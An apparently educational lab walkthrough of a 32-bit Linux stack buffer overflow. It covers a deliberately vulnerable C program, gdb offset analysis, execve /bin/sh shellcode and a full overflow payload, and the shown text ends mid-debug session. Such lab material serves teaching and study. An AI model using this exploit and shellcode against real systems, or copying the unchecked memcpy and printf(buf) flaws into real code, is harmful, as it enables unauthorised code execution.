#### 1. Stack based buffer overflow Exploitation

###### Function prolog

Instruction | Description
------------|----------------
push ebp | save the value of old EBPmov ebp,esp | saves the current address of esp to ebp, ebp will act as the frame pointer
sub esp,20 | subtract space from stack for local variables.

###### Disable ASLR

```sh
u32@u32-VirtualBox:~/linux-exp$ cat /proc/sys/kernel/randomize_va_space
0
u32@u32-VirtualBox:~/linux-exp$
```

###### Vulnerable stack overflow functions

- strcpy()
- memcpy()
- gets()

###### Vulnerable program

```c
u32@u32-VirtualBox:~/linux-exp$ cat stack-overflow.c
#include<stdio.h>

int main(int argc, char *argv[])

{

	char buf[256];
	memcpy(buf, argv[1], strlen(argv[1]));
	printf(buf);

}
u32@u32-VirtualBox:~/linux-exp$
```

```sh
u32@u32-VirtualBox:~/linux-exp$ gcc stack-overflow.c -o stack-overflow -ggdb -z execstack -fno-stack-protector
```

###### Analysis

```sh
u32@u32-VirtualBox:~/linux-exp$ gdb ./stack-overflow -q
Reading symbols from ./stack-overflow...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804846b <+0>:	lea    ecx,[esp+0x4]
   0x0804846f <+4>:	and    esp,0xfffffff0
   0x08048472 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048475 <+10>:	push   ebp
   0x08048476 <+11>:	mov    ebp,esp
   0x08048478 <+13>:	push   ebx
   0x08048479 <+14>:	push   ecx
   0x0804847a <+15>:	sub    esp,0x100
   0x08048480 <+21>:	mov    ebx,ecx
   0x08048482 <+23>:	mov    eax,DWORD PTR [ebx+0x4]
   0x08048485 <+26>:	add    eax,0x4
   0x08048488 <+29>:	mov    eax,DWORD PTR [eax]
   0x0804848a <+31>:	sub    esp,0xc
   0x0804848d <+34>:	push   eax
   0x0804848e <+35>:	call   0x8048340 <strlen@plt>
   0x08048493 <+40>:	add    esp,0x10
   0x08048496 <+43>:	mov    edx,eax
   0x08048498 <+45>:	mov    eax,DWORD PTR [ebx+0x4]
   0x0804849b <+48>:	add    eax,0x4
   0x0804849e <+51>:	mov    eax,DWORD PTR [eax]
   0x080484a0 <+53>:	sub    esp,0x4
   0x080484a3 <+56>:	push   edx
   0x080484a4 <+57>:	push   eax
   0x080484a5 <+58>:	lea    eax,[ebp-0x108]
   0x080484ab <+64>:	push   eax
   0x080484ac <+65>:	call   0x8048330 <memcpy@plt>
   0x080484b1 <+70>:	add    esp,0x10
   0x080484b4 <+73>:	sub    esp,0xc
   0x080484b7 <+76>:	lea    eax,[ebp-0x108]
   0x080484bd <+82>:	push   eax
   0x080484be <+83>:	call   0x8048320 <printf@plt>
   0x080484c3 <+88>:	add    esp,0x10
   0x080484c6 <+91>:	mov    eax,0x0
   0x080484cb <+96>:	lea    esp,[ebp-0x8]
   0x080484ce <+99>:	pop    ecx
   0x080484cf <+100>:	pop    ebx
   0x080484d0 <+101>:	pop    ebp
   0x080484d1 <+102>:	lea    esp,[ecx-0x4]
   0x080484d4 <+105>:	ret
End of assembler dump.
(gdb)
```

```sh
u32@u32-VirtualBox:~/linux-exp$ ./stack-overflow $(python -c 'print "A"*256')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0���u32@u32-VirtualBox:~/linux-exp$
u32@u32-VirtualBox:~/linux-exp$
```

```sh
u32@u32-VirtualBox:~/linux-exp$ ./stack-overflow $(python -c 'print "A"*270')
Segmentation fault (core dumped)
u32@u32-VirtualBox:~/linux-exp$
```

```sh
u32@u32-VirtualBox:~/linux-exp$ gdb ./stack-overflow -q
Reading symbols from ./stack-overflow...done.
(gdb) list 1
1	#include<stdio.h>
2
3	int main(int argc, char *argv[])
4
5	{
6
7		char buf[256];
8		memcpy(buf, argv[1], strlen(argv[1]));
9		printf(buf);
10
(gdb)
11	}
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804846b <+0>:	lea    ecx,[esp+0x4]
   0x0804846f <+4>:	and    esp,0xfffffff0
   0x08048472 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048475 <+10>:	push   ebp
   0x08048476 <+11>:	mov    ebp,esp
   0x08048478 <+13>:	push   ebx
   0x08048479 <+14>:	push   ecx
   0x0804847a <+15>:	sub    esp,0x100
   0x08048480 <+21>:	mov    ebx,ecx
   0x08048482 <+23>:	mov    eax,DWORD PTR [ebx+0x4]
   0x08048485 <+26>:	add    eax,0x4
   0x08048488 <+29>:	mov    eax,DWORD PTR [eax]
   0x0804848a <+31>:	sub    esp,0xc
   0x0804848d <+34>:	push   eax
   0x0804848e <+35>:	call   0x8048340 <strlen@plt>
   0x08048493 <+40>:	add    esp,0x10
   0x08048496 <+43>:	mov    edx,eax
   0x08048498 <+45>:	mov    eax,DWORD PTR [ebx+0x4]
   0x0804849b <+48>:	add    eax,0x4
   0x0804849e <+51>:	mov    eax,DWORD PTR [eax]
   0x080484a0 <+53>:	sub    esp,0x4
   0x080484a3 <+56>:	push   edx
   0x080484a4 <+57>:	push   eax
   0x080484a5 <+58>:	lea    eax,[ebp-0x108]
   0x080484ab <+64>:	push   eax
   0x080484ac <+65>:	call   0x8048330 <memcpy@plt>
   0x080484b1 <+70>:	add    esp,0x10
   0x080484b4 <+73>:	sub    esp,0xc
   0x080484b7 <+76>:	lea    eax,[ebp-0x108]
   0x080484bd <+82>:	push   eax
   0x080484be <+83>:	call   0x8048320 <printf@plt>
   0x080484c3 <+88>:	add    esp,0x10
   0x080484c6 <+91>:	mov    eax,0x0
   0x080484cb <+96>:	lea    esp,[ebp-0x8]
   0x080484ce <+99>:	pop    ecx
   0x080484cf <+100>:	pop    ebx
   0x080484d0 <+101>:	pop    ebp
   0x080484d1 <+102>:	lea    esp,[ecx-0x4]
   0x080484d4 <+105>:	ret
End of assembler dump.
(gdb) break *0x080484ac
Breakpoint 1 at 0x80484ac: file stack-overflow.c, line 8.
(gdb) break *0x080484c3
Breakpoint 2 at 0x80484c3: file stack-overflow.c, line 9.
(gdb) run $(python -c 'print "A"*272')
Starting program: /home/u32/linux-exp/stack-overflow $(python -c 'print "A"*272')

Breakpoint 1, 0x080484ac in main (argc=2, argv=0xbffff584) at stack-overflow.c:8
8		memcpy(buf, argv[1], strlen(argv[1]));
(gdb) info registers
eax            0xbffff3d0	-1073744944
ecx            0x18	24
edx            0x110	272
ebx            0xbffff4f0	-1073744656
esp            0xbffff3c0	0xbffff3c0
ebp            0xbffff4d8	0xbffff4d8
esi            0x2	2
edi            0xb7fb8000	-1208254464
eip            0x80484ac	0x80484ac <main+65>
eflags         0x296	[ PF AF SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/20x $ebp
0xbffff4d8:	0x00000000	0xb7e1a276	0x00000002	0xb7fb8000
0xbffff4e8:	0x00000000	0xb7e1a276	0x00000002	0xbffff584
0xbffff4f8:	0xbffff590	0x00000000	0x00000000	0x00000000
0xbffff508:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
0xbffff518:	0x00000002	0xb7fb8000	0x00000000	0x815113d9
(gdb) c
Continuing.

Breakpoint 2, 0x080484c3 in main (
    argc=<error reading variable: Cannot access memory at address 0x41414141>,
    argv=<error reading variable: Cannot access memory at address 0x41414145>)
    at stack-overflow.c:9
9		printf(buf);
(gdb) info registers
eax            0x111	273
ecx            0x804b119	134525209
edx            0xb7fb9870	-1208248208
ebx            0xbffff4f0	-1073744656
esp            0xbffff3c0	0xbffff3c0
ebp            0xbffff4d8	0xbffff4d8
esi            0x2	2
edi            0xb7fb8000	-1208254464
eip            0x80484c3	0x80484c3 <main+88>
eflags         0x282	[ SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/20x $ebp
0xbffff4d8:	0x41414141	0x41414141	0x00000002	0xb7fb8000
0xbffff4e8:	0x00000000	0xb7e1a276	0x00000002	0xbffff584
0xbffff4f8:	0xbffff590	0x00000000	0x00000000	0x00000000
0xbffff508:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
0xbffff518:	0x00000002	0xb7fb8000	0x00000000	0x815113d9
(gdb)
```

**```Saved Frame Pointer``` ```Return Address```**


```sh
root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_create.rb -l 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 0x41386941
[*] Exact match at offset 264 (Saved Frame Pointer)
root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 0x6a413969
[*] Exact match at offset 268 (Return Address)
root@kali:/usr/share/metasploit-framework/tools/exploit#
```

```sh
u32@u32-VirtualBox:~/linux-exp$ gdb ./stack-overflow -q
Reading symbols from ./stack-overflow...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804846b <+0>:	lea    ecx,[esp+0x4]
   0x0804846f <+4>:	and    esp,0xfffffff0
   0x08048472 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048475 <+10>:	push   ebp
   0x08048476 <+11>:	mov    ebp,esp
   0x08048478 <+13>:	push   ebx
   0x08048479 <+14>:	push   ecx
   0x0804847a <+15>:	sub    esp,0x100
   0x08048480 <+21>:	mov    ebx,ecx
   0x08048482 <+23>:	mov    eax,DWORD PTR [ebx+0x4]
   0x08048485 <+26>:	add    eax,0x4
   0x08048488 <+29>:	mov    eax,DWORD PTR [eax]
   0x0804848a <+31>:	sub    esp,0xc
   0x0804848d <+34>:	push   eax
   0x0804848e <+35>:	call   0x8048340 <strlen@plt>
   0x08048493 <+40>:	add    esp,0x10
   0x08048496 <+43>:	mov    edx,eax
   0x08048498 <+45>:	mov    eax,DWORD PTR [ebx+0x4]
   0x0804849b <+48>:	add    eax,0x4
   0x0804849e <+51>:	mov    eax,DWORD PTR [eax]
   0x080484a0 <+53>:	sub    esp,0x4
   0x080484a3 <+56>:	push   edx
   0x080484a4 <+57>:	push   eax
   0x080484a5 <+58>:	lea    eax,[ebp-0x108]
   0x080484ab <+64>:	push   eax
   0x080484ac <+65>:	call   0x8048330 <memcpy@plt>
   0x080484b1 <+70>:	add    esp,0x10
   0x080484b4 <+73>:	sub    esp,0xc
   0x080484b7 <+76>:	lea    eax,[ebp-0x108]
   0x080484bd <+82>:	push   eax
   0x080484be <+83>:	call   0x8048320 <printf@plt>
   0x080484c3 <+88>:	add    esp,0x10
   0x080484c6 <+91>:	mov    eax,0x0
   0x080484cb <+96>:	lea    esp,[ebp-0x8]
   0x080484ce <+99>:	pop    ecx
   0x080484cf <+100>:	pop    ebx
   0x080484d0 <+101>:	pop    ebp
   0x080484d1 <+102>:	lea    esp,[ecx-0x4]
   0x080484d4 <+105>:	ret
End of assembler dump.
(gdb) break *0x080484ac
Breakpoint 1 at 0x80484ac: file stack-overflow.c, line 8.
(gdb) break *0x080484c3
Breakpoint 2 at 0x80484c3: file stack-overflow.c, line 9.
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Starting program: /home/u32/linux-exp/stack-overflow Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Breakpoint 1, 0x080484ac in main (argc=2, argv=0xbffff574) at stack-overflow.c:8
8		memcpy(buf, argv[1], strlen(argv[1]));
(gdb) x/20x $ebp
0xbffff4c8:	0x00000000	0xb7e1a276	0x00000002	0xb7fb8000
0xbffff4d8:	0x00000000	0xb7e1a276	0x00000002	0xbffff574
0xbffff4e8:	0xbffff580	0x00000000	0x00000000	0x00000000
0xbffff4f8:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
0xbffff508:	0x00000002	0xb7fb8000	0x00000000	0x0ce6595b
(gdb) c
Continuing.

Breakpoint 2, 0x080484c3 in main (
    argc=<error reading variable: Cannot access memory at address 0x69413569>,
    argv=<error reading variable: Cannot access memory at address 0x6941356d>)
    at stack-overflow.c:9
9		printf(buf);
(gdb) x/20x $ebp
0xbffff4c8:	0x41386941	0x6a413969	0x316a4130	0x41326a41
0xbffff4d8:	0x6a41336a	0x356a4134	0x41366a41	0x6a41376a
0xbffff4e8:	0x396a4138	0x00000000	0x00000000	0x00000000
0xbffff4f8:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
0xbffff508:	0x00000002	0xb7fb8000	0x00000000	0x0ce6595b
(gdb)
```

```sh
u32@u32-VirtualBox:~/linux-exp$ gdb ./stack-overflow -q
Reading symbols from ./stack-overflow...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804846b <+0>:	lea    ecx,[esp+0x4]
   0x0804846f <+4>:	and    esp,0xfffffff0
   0x08048472 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048475 <+10>:	push   ebp
   0x08048476 <+11>:	mov    ebp,esp
   0x08048478 <+13>:	push   ebx
   0x08048479 <+14>:	push   ecx
   0x0804847a <+15>:	sub    esp,0x100
   0x08048480 <+21>:	mov    ebx,ecx
   0x08048482 <+23>:	mov    eax,DWORD PTR [ebx+0x4]
   0x08048485 <+26>:	add    eax,0x4
   0x08048488 <+29>:	mov    eax,DWORD PTR [eax]
   0x0804848a <+31>:	sub    esp,0xc
   0x0804848d <+34>:	push   eax
   0x0804848e <+35>:	call   0x8048340 <strlen@plt>
   0x08048493 <+40>:	add    esp,0x10
   0x08048496 <+43>:	mov    edx,eax
   0x08048498 <+45>:	mov    eax,DWORD PTR [ebx+0x4]
   0x0804849b <+48>:	add    eax,0x4
   0x0804849e <+51>:	mov    eax,DWORD PTR [eax]
   0x080484a0 <+53>:	sub    esp,0x4
   0x080484a3 <+56>:	push   edx
   0x080484a4 <+57>:	push   eax
   0x080484a5 <+58>:	lea    eax,[ebp-0x108]
   0x080484ab <+64>:	push   eax
   0x080484ac <+65>:	call   0x8048330 <memcpy@plt>
   0x080484b1 <+70>:	add    esp,0x10
   0x080484b4 <+73>:	sub    esp,0xc
   0x080484b7 <+76>:	lea    eax,[ebp-0x108]
   0x080484bd <+82>:	push   eax
   0x080484be <+83>:	call   0x8048320 <printf@plt>
   0x080484c3 <+88>:	add    esp,0x10
   0x080484c6 <+91>:	mov    eax,0x0
   0x080484cb <+96>:	lea    esp,[ebp-0x8]
   0x080484ce <+99>:	pop    ecx
   0x080484cf <+100>:	pop    ebx
   0x080484d0 <+101>:	pop    ebp
   0x080484d1 <+102>:	lea    esp,[ecx-0x4]
   0x080484d4 <+105>:	ret
End of assembler dump.
(gdb) break *0x080484ac
Breakpoint 1 at 0x80484ac: file stack-overflow.c, line 8.
(gdb) break *0x080484be
Breakpoint 2 at 0x80484be: file stack-overflow.c, line 9.
(gdb) run $(python -c 'print "A"*264+"B"*4+"C"*4')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/u32/linux-exp/stack-overflow $(python -c 'print "A"*264+"B"*4+"C"*4')

Breakpoint 1, 0x080484ac in main (argc=2, argv=0xbffff594) at stack-overflow.c:8
8		memcpy(buf, argv[1], strlen(argv[1]));
(gdb) x/20x $ebp
0xbffff4e8:	0x00000000	0xb7e1a276	0x00000002	0xb7fb8000
0xbffff4f8:	0x00000000	0xb7e1a276	0x00000002	0xbffff594
0xbffff508:	0xbffff5a0	0x00000000	0x00000000	0x00000000
0xbffff518:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
0xbffff528:	0x00000002	0xb7fb8000	0x00000000	0xab4acafe
(gdb) x/100x $esp
0xbffff3d0:	0xbffff3e0	0xbffff6e4	0x00000110	0xf63d4e2e
0xbffff3e0:	0xb7e0f668	0xb7e05f12	0x07b1ea71	0xbffff410
0xbffff3f0:	0xbffff4a0	0x000008ee	0x00000000	0x00000000
0xbffff400:	0x00000000	0x00000000	0xb7fff000	0xb7fffc08
0xbffff410:	0x00000000	0x00000000	0x00000000	0xbffff4ac
0xbffff420:	0xb7fe3f19	0x00000000	0xb7fffad0	0xbffff4a8
0xbffff430:	0xbffff4f0	0xb7fe4a9b	0x0804821c	0xbffff4a8
0xbffff440:	0xb7fffa74	0x00000001	0xb7fd5b48	0x00000001
0xbffff450:	0x00000000	0x00000001	0xb7fff918	0xb7e93b7b
0xbffff460:	0xbffff48e	0x00000000	0xb7fe49c0	0xb7fffc08
0xbffff470:	0xbffff48f	0x00000000	0x00c30000	0x00000000
0xbffff480:	0xb7fff000	0xb7fff918	0xbffff4a0	0x0804826b
0xbffff490:	0x00000000	0xbffff534	0xb7fb8000	0x00000016
0xbffff4a0:	0xffffffff	0xb7fb8000	0xb7e0ee18	0xb7fd5858
0xbffff4b0:	0xb7fb8000	0xb7fb8000	0xb7ffed00	0x00040000
0xbffff4c0:	0x00000000	0xbffff594	0xb7e30b80	0x0804852b
0xbffff4d0:	0x00000002	0xbffff594	0xbffff5a0	0x08048501
0xbffff4e0:	0xbffff500	0x00000000	0x00000000	0xb7e1a276
0xbffff4f0:	0x00000002	0xb7fb8000	0x00000000	0xb7e1a276
0xbffff500:	0x00000002	0xbffff594	0xbffff5a0	0x00000000
0xbffff510:	0x00000000	0x00000000	0xb7fb8000	0xb7fffc04
0xbffff520:	0xb7fff000	0x00000000	0x00000002	0xb7fb8000
0xbffff530:	0x00000000	0xab4acafe	0x97e4a6ee	0x00000000
0xbffff540:	0x00000000	0x00000000	0x00000002	0x08048370
0xbffff550:	0x00000000	0xb7ff0020	0xb7e1a189	0xb7fff000
(gdb) c
Continuing.

Breakpoint 2, 0x080484c3 in main (
    argc=<error reading variable: Cannot access memory at address 0x41414141>,
    argv=<error reading variable: Cannot access memory at address 0x41414145>)
    at stack-overflow.c:9
9		printf(buf);
(gdb) x/20x $ebp
0xbffff4e8:	0x42424242	0x43434343	0x00000002	0xb7fb8000
0xbffff4f8:	0x00000000	0xb7e1a276	0x00000002	0xbffff594
0xbffff508:	0xbffff5a0	0x00000000	0x00000000	0x00000000
0xbffff518:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
0xbffff528:	0x00000002	0xb7fb8000	0x00000000	0xab4acafe
(gdb) x/100x $esp
0xbffff3d0:	0xbffff3e0	0xbffff6e4	0x00000110	0xf63d4e2e
0xbffff3e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff3f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff400:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff410:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff420:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff430:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff440:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff450:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff460:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff470:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff480:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff490:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4e0:	0x41414141	0x41414141	0x42424242	0x43434343
0xbffff4f0:	0x00000002	0xb7fb8000	0x00000000	0xb7e1a276
0xbffff500:	0x00000002	0xbffff594	0xbffff5a0	0x00000000
0xbffff510:	0x00000000	0x00000000	0xb7fb8000	0xb7fffc04
0xbffff520:	0xb7fff000	0x00000000	0x00000002	0xb7fb8000
0xbffff530:	0x00000000	0xab4acafe	0x97e4a6ee	0x00000000
0xbffff540:	0x00000000	0x00000000	0x00000002	0x08048370
0xbffff550:	0x00000000	0xb7ff0020	0xb7e1a189	0xb7fff000
(gdb)
```

###### Exploit Construction

```nasm
u32@u32-VirtualBox:~/linux-exp$ cat bin_sh.nasm
xor    eax,eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
push   eax
push   ebx
mov    ecx,esp
mov    al,0xb
int    0x80
u32@u32-VirtualBox:~/linux-exp$
```

```sh
u32@u32-VirtualBox:~/linux-exp$ ./compile_ld.sh bin_sh
[+] Assebling with Nasm ...
[+] Linking ...
ld: warning: cannot find entry symbol _start; defaulting to 0000000008048060
[+] Done!
u32@u32-VirtualBox:~/linux-exp$
```

```sh
u32@u32-VirtualBox:~/linux-exp$ objdump -d ./bin_sh | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
u32@u32-VirtualBox:~/linux-exp$
```

```sh
u32@u32-VirtualBox:~/linux-exp$ cat shellcode.c
#include <stdio.h>
#include <string.h>

char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
					 "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}
u32@u32-VirtualBox:~/linux-exp$
```

```sh
u32@u32-VirtualBox:~/linux-exp$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

```sh
u32@u32-VirtualBox:~/linux-exp$ ./shellcode
Length: 23
$
u32@u32-VirtualBox:~/linux-exp$
```

```A * 245``` + ```SHELLCODE``` + ```0xbffff3f0```

```
run $(python -c 'print "A"*(268-23)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\xf0\xf3\xff\xbf"')
```

```sh
u32@u32-VirtualBox:~/linux-exp$ gdb ./stack-overflow -q
Reading symbols from ./stack-overflow...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804846b <+0>:	lea    ecx,[esp+0x4]
   0x0804846f <+4>:	and    esp,0xfffffff0
   0x08048472 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048475 <+10>:	push   ebp
   0x08048476 <+11>:	mov    ebp,esp
   0x08048478 <+13>:	push   ebx
   0x08048479 <+14>:	push   ecx
   0x0804847a <+15>:	sub    esp,0x100
   0x08048480 <+21>:	mov    ebx,ecx
   0x08048482 <+23>:	mov    eax,DWORD PTR [ebx+0x4]
   0x08048485 <+26>:	add    eax,0x4
   0x08048488 <+29>:	mov    eax,DWORD PTR [eax]
   0x0804848a <+31>:	sub    esp,0xc
   0x0804848d <+34>:	push   eax
   0x0804848e <+35>:	call   0x8048340 <strlen@plt>
   0x08048493 <+40>:	add    esp,0x10
   0x08048496 <+43>:	mov    edx,eax
   0x08048498 <+45>:	mov    eax,DWORD PTR [ebx+0x4]
   0x0804849b <+48>:	add    eax,0x4
   0x0804849e <+51>:	mov    eax,DWORD PTR [eax]
   0x080484a0 <+53>:	sub    esp,0x4
   0x080484a3 <+56>:	push   edx
   0x080484a4 <+57>:	push   eax
   0x080484a5 <+58>:	lea    eax,[ebp-0x108]
   0x080484ab <+64>:	push   eax
   0x080484ac <+65>:	call   0x8048330 <memcpy@plt>
   0x080484b1 <+70>:	add    esp,0x10
   0x080484b4 <+73>:	sub    esp,0xc
   0x080484b7 <+76>:	lea    eax,[ebp-0x108]
   0x080484bd <+82>:	push   eax
   0x080484be <+83>:	call   0x8048320 <printf@plt>
   0x080484c3 <+88>:	add    esp,0x10
   0x080484c6 <+91>:	mov    eax,0x0
   0x080484cb <+96>:	lea    esp,[ebp-0x8]
   0x080484ce <+99>:	pop    ecx
   0x080484cf <+100>:	pop    ebx
   0x080484d0 <+101>:	pop    ebp
   0x080484d1 <+102>:	lea    esp,[ecx-0x4]
   0x080484d4 <+105>:	ret
End of assembler dump.
(gdb) break *0x080484ac
Breakpoint 1 at 0x80484ac: file stack-overflow.c, line 8.
(gdb) break *0x080484c3
Breakpoint 2 at 0x80484c3: file stack-overflow.c, line 9.
(gdb) run $(python -c 'print "A"*(268-23)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\xf0\xf3\xff\xbf"')
Starting program: /home/u32/linux-exp/stack-overflow $(python -c 'print "A"*(268-23)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\xf0\xf3\xff\xbf"')

Breakpoint 1, 0x080484ac in main (argc=2, argv=0xbffff594) at stack-overflow.c:8
8		memcpy(buf, argv[1], strlen(argv[1]));
(gdb) x/20x $ebp
0xbffff4e8:	0x00000000	0xb7e1a276	0x00000002	0xb7fb8000
0xbffff4f8:	0x00000000	0xb7e1a276	0x00000002	0xbffff594
0xbffff508:	0xbffff5a0	0x00000000	0x00000000	0x00000000
0xbffff518:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
0xbffff528:	0x00000002	0xb7fb8000	0x00000000	0xe94d2b77
(gdb) x/100x $esp
0xbffff3d0:	0xbffff3e0	0xbffff6e4	0x00000110	0xf63d4e2e
0xbffff3e0:	0xb7e0f668	0xb7e05f12	0x07b1ea71	0xbffff410
0xbffff3f0:	0xbffff4a0	0x000008ee	0x00000000	0x00000000
0xbffff400:	0x00000000	0x00000000	0xb7fff000	0xb7fffc08
0xbffff410:	0x00000000	0x00000000	0x00000000	0xbffff4ac
0xbffff420:	0xb7fe3f19	0x00000000	0xb7fffad0	0xbffff4a8
0xbffff430:	0xbffff4f0	0xb7fe4a9b	0x0804821c	0xbffff4a8
0xbffff440:	0xb7fffa74	0x00000001	0xb7fd5b48	0x00000001
0xbffff450:	0x00000000	0x00000001	0xb7fff918	0xb7e93b7b
0xbffff460:	0xbffff48e	0x00000000	0xb7fe49c0	0xb7fffc08
0xbffff470:	0xbffff48f	0x00000000	0x00c30000	0x00000000
0xbffff480:	0xb7fff000	0xb7fff918	0xbffff4a0	0x0804826b
0xbffff490:	0x00000000	0xbffff534	0xb7fb8000	0x00000016
0xbffff4a0:	0xffffffff	0xb7fb8000	0xb7e0ee18	0xb7fd5858
0xbffff4b0:	0xb7fb8000	0xb7fb8000	0xb7ffed00	0x00040000
0xbffff4c0:	0x00000000	0xbffff594	0xb7e30b80	0x0804852b
0xbffff4d0:	0x00000002	0xbffff594	0xbffff5a0	0x08048501
0xbffff4e0:	0xbffff500	0x00000000	0x00000000	0xb7e1a276
0xbffff4f0:	0x00000002	0xb7fb8000	0x00000000	0xb7e1a276
0xbffff500:	0x00000002	0xbffff594	0xbffff5a0	0x00000000
0xbffff510:	0x00000000	0x00000000	0xb7fb8000	0xb7fffc04
0xbffff520:	0xb7fff000	0x00000000	0x00000002	0xb7fb8000
0xbffff530:	0x00000000	0xe94d2b77	0xd5e34767	0x00000000
0xbffff540:	0x00000000	0x00000000	0x00000002	0x08048370
0xbffff550:	0x00000000	0xb7ff0020	0xb7e1a189	0xb7fff000
(gdb) c
Continuing.

Breakpoint 2, 0x080484c3 in main (
